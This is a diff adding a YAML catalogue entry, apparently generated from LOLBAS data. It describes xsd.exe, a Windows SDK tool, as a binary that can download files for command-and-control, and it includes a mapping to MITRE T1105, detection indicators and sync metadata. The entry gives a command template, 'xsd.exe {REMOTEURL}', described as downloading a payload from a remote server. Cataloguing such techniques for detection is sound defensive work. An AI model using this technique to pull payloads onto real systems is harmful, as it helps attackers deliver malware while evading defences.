@@ -1,0 +1,89 @@
+id: lolbas/T3RoZXJNU0JpbmFyaWVzL3hzZC55bWw/RG93bmxvYWQ/0
+type: binary
+platform: windows
+name: xsd.exe
+phases:
+- command-and-control
+capabilities:
+- file-download
+privilege_required: user
+sources:
+- project: LOLBAS
+  upstream_url: https://lolbas-project.github.io
+  license: GPL-3.0
+  upstream_version: 2056cb7662509dc998fc6ce79636aec4e6c0397f
+  last_synced: '2026-11-13'
+attack_techniques:
+- T1105
+opsec:
+  noise: high
+  triggers: URL on a xsd.exe command line
+commands:
+- template: xsd.exe {REMOTEURL}
+  comment: Downloads payload from remote server
+references:
+- https://lolbas-project.github.io/lolbas/OtherMSBinaries/xsd/
+tags:
+- windows
+- lolbas
+source_data:
+  LOLBAS:
+    raw:
+      name: xsd.exe
+      category: Download
+      privileges: User
+      mitre_id: T1105
+      source_file: OtherMSBinaries/xsd.yml
+      command_source_index: 0
+      document_utf8: "---\nName: xsd.exe\nDescription: XML Schema Definition Tool included with the Windows\
+        \ Software Development Kit (SDK).\nAuthor: Avihay Eldad\nCreated: 2024-04-09\nCommands:\n  - Command:\
+        \ xsd.exe {REMOTEURL}\n    Description: Downloads payload from remote server\n    Usecase: It\
+        \ will download a remote payload and place it in INetCache\n    Category: Download\n    Privileges:\
+        \ User\n    MitreID: T1105\n    OperatingSystem: Windows\n    Tags:\n      - Download: INetCache\n\
+        Full_Path:\n  - Path: C:\\Program Files (x86)\\Microsoft SDKs\\Windows\\<version>\\bin\\NETFX\
+        \ <version> Tools\\xsd.exe\nDetection:\n  - IOC: URL on a xsd.exe command line\n  - IOC: xsd.exe\
+        \ making unexpected network connections or DNS requests\nAcknowledgement:\n  - Person: Avihay\
+        \ Eldad\n    Handle: '@AvihayEldad'\n"
+      document_sha256: sha256:81b8b7ec0b9c4ac42a3be6a020492d069e777e60c745debaa792be0331dddd3c
+    upstream_url: https://lolbas-project.github.io/lolbas/OtherMSBinaries/xsd/
+    upstream_version: 2056cb7662509dc998fc6ce79636aec4e6c0397f
+    last_synced: '2026-11-13'
+enrichment:
+  capabilities:
+  - value: file-download
+    provenance:
+      type: adapter
+      source: LOLBAS
+      adapter: lolbas@2056cb7662509dc998fc6ce79636aec4e6c0397f
+    confidence:
+      level: high
+  phases:
+  - value: command-and-control
+    provenance:
+      type: adapter
+      source: LOLBAS
+      adapter: lolbas@2056cb7662509dc998fc6ce79636aec4e6c0397f
+    confidence:
+      level: high
+  attack_techniques:
+  - value: T1105
+    provenance:
+      type: upstream
+      source: LOLBAS
+      adapter: lolbas@2056cb7662509dc998fc6ce79636aec4e6c0397f
+    confidence:
+      level: high
+  privilege_required:
+    value: user
+    provenance:
+      type: adapter
+      source: LOLBAS
+      adapter: lolbas@2056cb7662509dc998fc6ce79636aec4e6c0397f
+    confidence:
+      level: high
+_meta:
+  schema_version: 1
+  generated_by: loldex-projection
+  projected_at: '2026-11-13'
+  source_hashes:
+    LOLBAS: sha256:10faf9c16b2f9ad7bea694a154f1a3a5d461eae5eaf8933442054c2ac31138b4
